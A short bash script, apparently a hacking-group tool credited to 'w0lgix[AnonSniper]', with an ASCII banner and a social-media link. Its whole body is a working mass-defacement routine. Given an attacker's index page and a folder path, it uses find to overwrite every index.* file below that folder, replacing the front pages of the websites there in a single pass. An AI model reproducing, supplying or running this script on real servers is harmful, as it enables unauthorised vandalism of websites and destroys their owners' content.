#!/bin/bash


echo "###################################################"
echo "#https://www.facebook.com/Officiel.mhmad          #"
echo "#                                                 #"
echo "# ░░░░░░███████ ]▄▄▄▄▄▄▄▄                         #"
echo "#▂▄▅█████████▅▄▃▂                                 #"
echo "#I███████████████████].                           #"
echo "#◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...                               #"
echo "#             Coded by w0lgix[AnonSniper]         #"
echo "#                 v1.0                            #"
echo "#                                                 #"
echo "#            Using ./mass.sh                      #"
echo "###################################################"

if [  -z "$1" ] && [ -z  "$2" ];then
echo '[+] ./mass.sh [index-path] [folder-path]'
echo
exit

else
echo -e "Staring Time in: $(date +"%r %a "%d"/"%m"/"%y)"
echo '[+] Starting ........'
sleep 1
find $2 -name "index.*" -exec cp $1 {} \;
echo 
echo '[+] Done !'
echo -e "Finish Time in: $(date +"%r %a "%d"/"%m"/"%y)"
fi
